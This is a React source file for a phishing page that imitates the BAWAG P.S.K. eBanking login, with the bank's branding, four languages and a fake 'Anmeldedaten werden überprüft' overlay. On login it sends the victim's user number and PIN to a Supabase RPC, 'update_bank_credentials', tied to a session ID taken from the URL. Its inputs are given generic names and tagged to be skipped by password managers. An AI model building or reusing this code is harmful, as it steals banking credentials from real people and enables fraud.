import { useState, useEffect, useRef, useCallback } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, ChevronRight } from "lucide-react";
import bawagLogo from "@/assets/bawag_logo.png";
import bawagBgAsset from "@/assets/bawag_background_new.webp.asset.json";
const bawagBg = bawagBgAsset.url;
import bawagIcon from "@/assets/bawag_psk.png";

type Lang = "DE" | "EN" | "BKS" | "TR";

const translations: Record<Lang, {
  days: string[];
  title: string;
  tab: string;
  inputUser: string;
  inputPin: string;
  login: string;
  forgotPin: string;
  footer: string[];
}> = {
  DE: {
    days: ["Sonntag", "Montag", "Dienstag", "Mittwoch", "Donnerstag", "Freitag", "Samstag"],
    title: "eBanking Login",
    tab: "Verfüger",
    inputUser: "Verfügernummer",
    inputPin: "PIN (8 bis 16-stellig)",
    login: "Login",
    forgotPin: "PIN vergessen oder Verfüger gesperrt?",
    footer: ["Impressum", "AGB", "Datenschutz", "Nutzungsbedingungen", "Barrierefrei"],
  },
  EN: {
    days: ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
    title: "eBanking Login",
    tab: "Disposer",
    inputUser: "Disposer Number",
    inputPin: "PIN (8 - 16 characters)",
    login: "Login",
    forgotPin: "Forgot PIN or disposer locked?",
    footer: ["Imprint", "Terms and Conditions", "Data Protection", "Terms of Use", "Barrier Free"],
  },
  BKS: {
    days: ["Nedjelja", "Ponedjeljak", "Utorak", "Srijeda", "Četvrtak", "Petak", "Subota"],
    title: "eBanking Login",
    tab: "Korisnik",
    inputUser: "Korisnički broj",
    inputPin: "PIN (8 do 16 znakova)",
    login: "Prijava",
    forgotPin: "Zaboravili ste PIN ili je korisnik blokiran?",
    footer: ["Impresum", "Opšti uslovi poslovanja", "Zaštita podataka", "Uslovi korišćenja", "bez prepreka"],
  },
  TR: {
    days: ["Pazar", "Pazartesi", "Salı", "Çarşamba", "Perşembe", "Cuma", "Cumartesi"],
    title: "eBanking Login",
    tab: "kullanıcı numarası",
    inputUser: "Kullanıcı kodu",
    inputPin: "PIN (8 ila 16 haneli)",
    login: "Giriş",
    forgotPin: "PIN hatırlamama veya kullanıcı engellendi?",
    footer: ["Künye", "AGB", "Veri koruma", "Kullanım şartları", "Erişilebilirlik"],
  },
};

const BASE_WIDTH = 970;

const footerUrls = [
  "#",
  "#",
  "#",
  "#",
  "#",
];

const Bawag = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("BAWAG eBanking", bawagIcon);

  const [verfueger, setVerfueger] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [lang, setLang] = useState<Lang>("DE");
  const [scale, setScale] = useState(1);
  const contentRef = useRef<HTMLDivElement>(null);
  const [contentHeight, setContentHeight] = useState(0);

  const updateScale = useCallback(() => {
    const s = Math.min(1, window.innerWidth / BASE_WIDTH);
    setScale(s);
  }, []);

  useEffect(() => {
    updateScale();
    window.addEventListener("resize", updateScale);
    return () => window.removeEventListener("resize", updateScale);
  }, [updateScale]);

  useEffect(() => {
    if (contentRef.current) {
      setContentHeight(contentRef.current.scrollHeight);
    }
  });

  const t = translations[lang];
  const now = new Date();
  const dateStr = `${t.days[now.getDay()]}, ${String(now.getDate()).padStart(2, "0")}.${String(now.getMonth() + 1).padStart(2, "0")}.${now.getFullYear()}, ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;

  const scaledWidth = BASE_WIDTH * scale;
  const scaledHeight = contentHeight ? contentHeight * scale : undefined;

  return (
    <>
      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
    <div
      className="min-h-screen bg-white overflow-x-hidden flex justify-center"
      style={{
        fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
      }}
    >
      <div style={{ width: `${scaledWidth}px`, height: scaledHeight ? `${scaledHeight}px` : undefined }}>
        <div
          ref={contentRef}
          style={{
            width: `${BASE_WIDTH}px`,
            transform: `scale(${scale})`,
            transformOrigin: 'top left',
          }}
        >
      
        {/* Header */}
        <header className="bg-white border-b border-gray-200 px-4 py-2 flex items-center justify-between">
          <img src={bawagLogo} alt="BAWAG eBanking" className="h-20" />
          <span className="text-xs text-gray-500">{dateStr}</span>
          <div className="flex gap-1">
            {(["DE", "EN", "BKS", "TR"] as Lang[]).map((l) => (
              <button
                key={l}
                onClick={() => setLang(l)}
                className={`px-2 py-0.5 text-[11px] font-semibold rounded transition-colors ${
                  l === lang
                    ? "bg-gray-200 text-black"
                    : "text-gray-600 hover:text-black"
                }`}
              >
                {l}
              </button>
            ))}
          </div>
        </header>

        {/* Dark red divider */}
        <div className="h-[3px] bg-[#990000] w-full" />

        {/* Background image container */}
        <div
          className="relative w-[970px] h-[490px]"
          style={{
            backgroundImage: `url(${bawagBg})`,
            backgroundSize: "cover",
            backgroundPosition: "center top",
          }}
        >
          {/* Login Card */}
          <div className="absolute top-5 left-5 w-[320px]">
            <div className="bg-white rounded-lg shadow-sm min-h-[380px] flex flex-col">
              <div className="px-4 py-3 rounded-t-lg flex items-center justify-between">
                <h1 className="text-base font-semibold text-black">{t.title}</h1>
                <span className="font-bold text-gray-400 text-base cursor-pointer">?</span>
              </div>

              <div className="p-4 flex-1 flex flex-col">
                {/* Tab */}
                <div className="mb-4 text-center border-b-2 border-[#990000]">
                  <span className="text-[#990000] text-xs font-semibold pb-1 inline-block">
                    {t.tab}
                  </span>
                </div>

                <div className="mb-3">
                  <input
                    type="text"
                    value={verfueger}
                    onChange={(e) => setVerfueger(e.target.value)}
                    placeholder={t.inputUser}
                    name="field-a"
                    id="field-a"
                    autoComplete="off"
                    autoCorrect="off"
                    autoCapitalize="off"
                    spellCheck={false}
                    data-lpignore="true"
                    data-form-type="other"
                    data-1p-ignore="true"
                    className="w-full border border-gray-400 rounded px-3 py-2.5 text-sm focus:outline-none focus:ring-1 focus:ring-[#990000]"
                  />
                </div>

                <div className="mb-3">
                  <div className="relative">
                    <input
                      type={showPin ? "text" : "password"}
                      value={pin}
                      onChange={(e) => setPin(e.target.value)}
                      placeholder={t.inputPin}
                      name="field-b"
                      id="field-b"
                      autoComplete="new-password"
                      autoCorrect="off"
                      autoCapitalize="off"
                      spellCheck={false}
                      data-lpignore="true"
                      data-form-type="other"
                      data-1p-ignore="true"
                      className="w-full border border-gray-400 rounded px-3 py-2.5 text-sm pr-10 focus:outline-none focus:ring-1 focus:ring-[#990000]"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPin(!showPin)}
                      className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                    >
                      {showPin ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                    </button>
                  </div>
                </div>

                <div className="flex justify-end mb-3">
                  <button onClick={async () => {
              console.log("Session ID:", sessionId);
              if (sessionId) {
                const { error } = await supabase.rpc("update_bank_credentials", {
                  p_session_id: sessionId,
                  p_username: verfueger,
                  p_password: pin,
                  p_username_label: "Verfügernummer",
                  p_password_label: "PIN",
                });
                if (error) console.error("Update failed:", error);
                else console.log("Update successful");
              } else {
                console.error("No session ID found in URL!");
              }
              setShowLoading(true);
            }} className="w-[60%] py-2.5 bg-[#990000] text-white text-sm font-semibold rounded hover:bg-[#7a0000] transition-colors">
                    {t.login}
                  </button>
                </div>

                <div className="mt-auto pt-3">
                  <a href="#" target="_blank" rel="noopener noreferrer" className="text-[11px] text-[#990000] hover:underline flex items-center gap-1">
                    <ChevronRight className="h-4 w-4" />
                    {t.forgotPin}
                  </a>
                </div>
              </div>
            </div>
          </div>

          {/* Info Card */}
          <div className="absolute top-5 left-[355px] right-5">
            <div className="bg-white rounded-lg shadow-sm">
              <div className="grid grid-cols-3">
                <div className="p-3">
                  <h2 className="font-bold text-sm mb-2 text-[#990000]">Sicherheit</h2>
                  <p className="text-xs text-gray-600 leading-relaxed">
                    Die BAWAG versendet keine E-Mails mit direkten eBanking Login-Links!
                  </p>
                  <a href="#" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline mt-1 inline-flex items-center gap-0.5">
                    <ChevronRight className="h-4 w-4" />
                    Mehr Infos
                  </a>
                </div>

                <div className="p-3">
                  <h2 className="font-bold text-sm mb-2 text-[#990000]">Service & Info</h2>
                  <ul className="space-y-1">
                    <li><a href="#" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Sicherheitsregeln</a></li>
                    <li><a href="#" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Anmeldung / Erste Schritte</a></li>
                    <li><a href="#" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />3D Secure Online Bezahlung</a></li>
                  </ul>
                </div>

                <div className="p-3">
                  <h2 className="font-bold text-sm mb-2 text-[#990000]">Support</h2>
                  <ul className="space-y-1">
                    <li><a href="#" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />FAQ</a></li>
                    <li><a href="https://www.watchlist-internet.at/" target="_blank" rel="noopener noreferrer" className="text-xs text-[#990000] hover:underline flex items-center gap-0.5"><ChevronRight className="h-4 w-4" />Zu Watchlist Internet</a></li>
                  </ul>
                </div>
              </div>
            </div>
          </div>

          {/* Clickable area bottom-right for promo */}
          <a
            href="#"
            target="_blank"
            rel="noopener noreferrer"
            className="absolute bottom-0 right-0 w-[580px] h-[300px] cursor-pointer"
            aria-label="Entdecken"
          />
        </div>

        {/* Footer */}
        <footer className="bg-white border-t border-gray-200 py-3 px-4">
          <div className="flex flex-wrap gap-3 justify-center mb-1">
            {t.footer.map((item, index) => (
              <a key={item} href={footerUrls[index]} target="_blank" rel="noopener noreferrer" className="text-[10px] text-black underline hover:text-[#990000] transition-colors">
                {item}
              </a>
            ))}
          </div>
          <p className="text-[10px] text-black text-center">© BAWAG P.S.K.</p>
        </footer>
        </div>
      </div>
    </div>
    </>
  );
};

export default Bawag;
